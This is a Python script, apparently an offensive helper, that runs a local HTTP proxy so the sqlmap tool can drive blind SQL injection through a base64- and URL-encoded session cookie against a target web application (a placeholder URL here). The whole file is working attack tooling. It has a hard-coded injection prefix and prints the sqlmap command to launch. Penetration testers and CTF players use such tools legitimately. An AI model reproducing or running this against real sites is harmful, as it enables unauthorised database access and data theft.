#!/usr/bin/python3
# -*- coding: utf-8 -*-

from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import requests

# CONFIGURATION #

# Default port on localhost
# if you change the port, you'll have to specify it in sqlmap, ie for 888:
# $sqlmap -u "http://localhost:888/?p="
PORT = 80

# The name of the parameter you want to inject for localhost
# if you change the port, you'll have to specify it in sqlmap, ie for ?HERE:
# $sqlmap -u "http://localhost/?HERE="
PARAM = "?p="


class httpHandler(BaseHTTPRequestHandler):
    """ Main handler, do not touch except if you know what you do """
    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()

    def do_GET(self):
        self._set_headers()
        if "?p=" in self.path:
            sqliParam = self.path.split(PARAM)[1]
            response = req(urllib.parse.unquote(sqliParam))
            self.wfile.write(response)


def req(sqli):
    """ Compute SQLi requests with "sqli" param """

    s = requests.session()

    # -- Stuff you need to work on, ie base64 encode payload -- #

    import base64  # Used for example

    url = "http://sqliwebsite/index.php?id=6"  # Fake URL

    inject = "1' AND 0 OR "+str(sqli)+"--+"  # Here I force a blind SQLi
    # Encode in base64
    inject = base64.b64encode(inject.encode("utf-8")).decode("utf-8")
    inject = urllib.parse.quote(inject)  # Url Encode

    cookies = {  # My Cookies
        "PHPSESSID": "xyz",
        "Session": inject,  # For the example, the injection is into a cookie
        "ADMIN_SESSION": "abc"
    }

    r = s.get(url, cookies=cookies)  # Requests, check
    # http://docs.python-requests.org/en/master/user/quickstart/

    # -- End of the stuff you need to word on -- #

    return r.content


if __name__ == "__main__":

    title = """
    ############################################
    #  __..__..                .__          ,  #
    # (__ |  ||   ._ _  _.._   [__)*.  , _ -+- #
    # .__)|__\|___[ | )(_][_)  |   | \/ (_) |  #
    #                     |                    #
    #                           Code by Zeecka #
    ############################################
    """

    print(title)
    print("Starting httpd server...")

    server_address = ('', PORT)
    httpd = HTTPServer(server_address, httpHandler)

    print("Server is ok !")
    print("You can use sqlmap using the following command: ")

    txtport = ""
    if PORT != 80:
        txtport = ":"+str(PORT)
    print('\nsqlmap -u "http://localhost'+txtport+'/'+PARAM+'*"\n')

    httpd.serve_forever()
